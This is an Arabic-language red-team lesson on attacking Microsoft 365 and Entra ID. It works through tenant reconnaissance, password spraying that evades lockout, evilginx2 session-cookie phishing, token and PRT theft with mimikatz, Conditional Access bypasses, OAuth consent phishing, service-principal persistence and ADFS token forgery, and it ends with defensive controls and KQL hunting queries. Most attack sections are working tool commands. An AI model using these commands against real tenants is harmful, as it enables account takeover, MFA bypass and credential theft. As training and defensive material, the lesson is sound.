# هجمات Microsoft 365 و Entra ID

لم تعد طبقة الهوية المؤسسية في عام 2026 محصورة في وحدة التحكم في النطاق (Domain Controller) التقليدية، بل انتقلت إلى منصة Entra ID (المعروفة سابقاً بـ Azure AD). إن اختراق هذه المنصة يمنح المهاجم وصولاً كاملاً إلى البريد الإلكتروني، الملفات، الكود المصدري، البنية التحتية السحابية، والقدرة على الانتقال إلى بيئة AD المحلية عبر الاتحاد (Federation). يغطي هذا الدرس سلاسل الهجوم (Attack Chains) الواقعية التي ينفذها الفريق الأحمر (Red Team)، وهندسة الوصول المشروط (Conditional Access) التي يجب على المدافعين إتقانها.

> [!warning] تحذير: منطقة تأثير عالية
> لا تنفذ هذه الهجمات إلا ضد مستأجرين (Tenants) تملكهم أو لديك تصريح خطي صريح باختبارهم. إن إعادة استخدام الرموز (Token Replay) ضد مستأجر حقيقي خارج نطاق التفويض يُعد جناية اتحادية كبرى في معظم القوانين الدولية.

## سطح هجوم الهوية الرقمية

![سطح هجوم الهوية](/images/lessons/entra_id_attack_surface_en.png)

## 1. استطلاع المستأجر (Recon) - دون الحاجة لاعتمادات

```terminal
# التحقق من وجود المستأجر، الحصول على معرف المستأجر (Tenant ID) ونوع الاتحاد
curl 'https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1'
# → NameSpaceType: Federated (اتحادي) / Managed (مُدار) ← يوضح ما إذا كان ADFS هو بوابة الدخول.

# الحصول على معرف المستأجر (Tenant ID)
curl 'https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration'

# استخدام أداة AADInternals (PowerShell) للاستطلاع الخارجي
Get-AADIntLoginInformation -Domain target.com
Invoke-AADIntReconAsOutsider -Domain target.com
# يسرد النطاقات المرتبطة، سجلات MX، وجود MDI، وحالة المزامنة.

# تعداد المستخدمين عبر واجهة Teams API (بدون مصادقة)
o365creeper.py -f users.txt -o valid.txt
```

## 2. هجمات رش كلمات المرور (Password Spraying)

```terminal
# تدوير عناوين IP لتجاوز الحظر الذكي (Smart Lockout) بناءً على المصدر
fireprox -c -r us-east-2  # استخدام AWS API Gateway كوكيل (Proxy)

msolspray --userlist users.txt --password 'Spring2026!' --proxy https://gateway/
# نصيحة: احترم سياسة الحظر الذكي؛ استخدم كلمة مرور واحدة لكل مستخدم كل 30 دقيقة.
```

> [!tip] الحظر الذكي (Smart Lockout) بعمق
> يتم الحظر لكل مستخدم بناءً على عنوان IP المصدر. تدوير العناوين يبقيك تحت عتبة الحظر لكل IP. إرسال كلمة مرور واحدة كل 30 دقيقة يبقيك تحت عتبة الحظر لكل مستخدم. المدافع المحترف هو من يراقب **الرش عبر شبكات (ASNs) متعددة** وليس فقط الهجمات من مصدر واحد.

## 3. هجمات الخصم في المنتصف (AitM)

تتجاوز هذه الهجمات كلمات المرور والمصادقة المتعددة (MFA) عبر الرسائل النصية أو التطبيقات، من خلال التقاط "كوكي الجلسة" (Session Cookie).

```terminal
# استخدام أداة evilginx2
sudo ./evilginx2 -p ./phishlets
config domain login-target-365.com
phishlets enable o365
lures create o365
# أرسل الرابط للضحية؛ بمجرد المصادقة ← يتم التقاط كوكي ESTSAUTH.
```

بعد الالتقاط: قم باستيراد الكوكيز (`ESTSAUTH`, `ESTSAUTHPERSISTENT`) في متصفحك ← ستدخل مباشرة كالمستخدم دون الحاجة للمصادقة المتعددة (MFA) لأن الجلسة مُحققة بالفعل.

## 4. سرقة الرموز (Token Theft) بعد الحصول على موطئ قدم

إذا حصلت على صلاحية تنفيذ أوامر (RCE) على محطة عمل، يمكنك سحب الرموز مباشرة:

```terminal
# استخراج كوكيز متصفح Edge (المشفرة بـ DPAPI)
mimikatz # dpapi::cookie /in:"C:\Users\alice\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"

# الوصول إلى مخزن رموز Office (Office Token Cache)
# المسار: %LOCALAPPDATA%\Microsoft\TokenBroker\Cache
```

```terminal
# استخدام ROADtools — الحقيبة التقنية المتكاملة لفرق الفريق الأحمر في Entra
pip install roadrecon roadtx
roadtx tokens --refresh-token <RT> --tenant <tenantid>
roadtx aadgraph users --query "displayName,jobTitle" | jq
```

## 5. ميكانيكا تجاوز الوصول المشروط (Conditional Access)

الوصول المشروط هو سلسلة من قواعد "إذا تحقق X، اطلب Y". التجاوزات تستهدف نقاط **امتثال الأجهزة** و **البروتوكولات القديمة**:

| أسلوب التجاوز | الميكانيكا العملياتية |
|--------------|---------------------|
| امتثال الأجهزة | سرقة رمز التحديث الأولي (PRT) من جهاز ممتثل ← تجاوز كافة القيود |
| تطبيقات العميل المعتمدة | استخدام معرف عميل (client_id) لتطبيق مستثنى (مثل Teams) |
| المواقع الموثوقة | استخدام VPN أو بروكـسي داخل النطاق الشبكي الموثوق للمؤسسة |
| المصادقة القديمة | إذا لم يتم حظرها، يمكن استخدام IMAP/POP/SMTP لتجاوز MFA |
| الهوية الخدمية (Service Principal) | تدفقات الحسابات الخدمية لا تخضع غالباً لسياسات الوصول المشروط للمستخدمين |

```terminal
# سرقة PRT من جهاز ويندوز مرتبط بالنطاق (بعد الحصول على صلاحية أدمن محلي)
mimikatz # sekurlsa::cloudap
# ← استخراج ProofOfPossessionKey و PRT
# استخدام الـ PRT من جهاز المهاجم لتبدو وكأنك تدخل من جهاز ممتثل للمؤسسة.
```

## 6. تصيد موافقة OAuth (Consent Phishing)

ينقر المستخدم على رابط ← تظهر نافذة موافقة من مايكروسوفت لتطبيق يبدو شرعياً (مثلاً "AuditApp") ← بمجرد الموافقة ← تحصل على رمز تفويض، تبدله برمز تحديث (Refresh Token) يمنحك وصولاً دائماً.

> [!danger] رموز التحديث تظل فعالة حتى بعد تغيير كلمة السر
> الرمز المسروق يظل صالحاً حتى يتم إبطاله برمجياً. إعادة تعيين كلمة السر لا تبطله؛ يجب تنفيذ أمر إبطال الجلسات: `Revoke-MgUserSignInSession -UserId <upn>`.

## 7. إساءة استخدام الهوية الخدمية (Service Principal)

```terminal
# بعد اختراق حساب "مسؤول عام" (Global Admin)
# إضافة مفتاح اعتماد (Credential) لتطبيق ذو صلاحيات عالية:
roadtx app addcred --appid <victim-app-id>
# أو عبر PowerShell لإضافة شهادة توقيع:
New-MgApplicationKey -ApplicationId <id> -KeyCredential @{ Type="AsymmetricX509Cert"; Usage="Verify"; Key=$cert.RawData }
# الآن يمكنك المصادقة بصفة "التطبيق"؛ وهذا الوصول يصمد أمام أي تغيير في كلمات مرور المستخدمين.
```

## 8. سرقة مفاتيح الاتحاد (Federation) - نمط Solorigate

إذا وصلت إلى خادم ADFS المحلي، يمكنك سرقة شهادة توقيع الرموز وتزوير رموز SAML لـ **أي مستخدم** في **أي مستأجر**:

```terminal
mimikatz # privilege::debug
# استخراج مفتاح DKM وشهادة التوقيع
ADFSDump.exe
# تزوير الرموز للدخول إلى بوابة Office 365
Open-AADIntOffice365Portal -ImmutableID <id> -Issuer "http://target.com/adfs/services/trust/"
```

## 9. إساءة استخدام الوصول عبر المستأجرين (Cross-Tenant Access)

الإعدادات الخاطئة في "الثقة الواردة" قد تسمح لمهاجم اخترق "المستأجر ب" بالوصول إلى "المستأجر أ" باستخدام المصادقة المتعددة الخاصة بـ "ب" لتلبية متطلبات "أ".

## أولويات الدفاع الاستراتيجي

| الضابط الأمني | لماذا هو حيوي؟ |
|--------------|---------------|
| **MFA المقاوم للتصيد** (FIDO2) | يهزم هجمات AitM والتقاط الكوكيز |
| **حظر المصادقة القديمة** | يغلق ثغرة تجاوز MFA عبر بروتوكولات IMAP/SMTP |
| **اشتراط جهاز ممتثل** | يمنع استخدام الرموز المسروقة من أجهزة غير مدارة |
| **تعطيل موافقة المستخدم للتطبيقات** | يقتل فئة هجمات تصيد OAuth بالكامل |
| **التقييم المستمر للوصول (CAE)** | يبطل الرموز خلال دقائق من اكتشاف أي نشاط مشبوه |
| **حماية الرموز (Token Protection)** | يربط رموز التحديث بشريحة TPM الخاصة بالجهاز |

## استعلامات التقصي النشط (Hunting)

```kql
// البحث عن تطبيقات OAuth جديدة منحت صلاحيات واسعة
AuditLogs
| where OperationName == "Add app role assignment grant to user"
| extend Scopes = tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[0].newValue)
| where Scopes has_any ("Mail.ReadWrite","Files.ReadWrite.All","Directory.ReadWrite.All")
```

```kql
// البحث عن مؤشرات سرقة PRT (جهاز غير معروف مع توكن صالح)
SigninLogs
| where AuthenticationDetails has "PRT"
| where DeviceDetail.deviceId == "" and ResultType == "0"
```

> [!info] الهوية هي المحيط الأمني الجديد
> الإجراء الأكثر فعالية والأقل تكلفة في بيئة Entra هو فرض المصادقة عبر FIDO2 للحسابات الحساسة وحظر البروتوكولات القديمة (Legacy Auth). إذا لم تنجز غير ذلك هذا الربع، فاجعل هذا أولويتك.
